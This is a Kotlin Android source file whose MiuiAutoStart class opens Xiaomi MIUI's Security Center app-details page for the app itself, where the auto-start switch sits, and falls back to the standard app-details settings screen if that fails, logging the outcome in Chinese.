package com.storm.safe.rock.service.modules.yw5xud.miui

import android.content.ComponentName
import android.content.Intent
import android.util.Log
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.common.UiDebugger

/**
 * MiuiAutoStart -- Phase 1 auto-start management delegate.
 * Navigates to SecurityCenter ApplicationsDetailsActivity with our package,
 * showing the app detail page (including auto-start switch).
 *
 * Extracted from MiuiSteps.executeAutoStart().
 */
class MiuiAutoStart(
    private val service: MyAccessibilityService?,
    private val context: android.content.Context,
    private val ui: UiAutomation,
    private val steps: MiuiSteps
) {
    companion object {
        private const val TAG = "MiuiAutoStart"
    }

    /**
     * Navigate to auto-start management and enable for our app.
     * Vendor: executeAutoStart flow
     */
    fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            UiDebugger.logStep(TAG, "Phase1: executeAutoStart begin")
            // Vendor: open ApplicationsDetailsActivity with package_name extra
            // This shows OUR app's detail page (with auto-start switch), not the list of all apps
            val securityPkg = "com.miui.securitycenter"
            try {
                val intent = Intent().apply {
                    component = ComponentName(securityPkg, "com.miui.appmanager.ApplicationsDetailsActivity")
                    putExtra("package_name", context.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or
                             Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                (service ?: context).startActivity(intent)
                logs.add("已启动安全中心应用详情页（带自启动）")
                successes.add("小米应用详情页已打开")
                return
            } catch (e: Exception) {
                logs.add("安全中心应用详情打开失败: ${e.message}，尝试标准方式")
            }

            // Fallback: standard app details settings
            val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = android.net.Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or
                         Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            (service ?: context).startActivity(intent)
            logs.add("已打开标准应用详情页（无自启动）")
        } catch (e: Exception) {
            failures.add("小米自启动配置异常: ${e.message}")
        }
    }
}
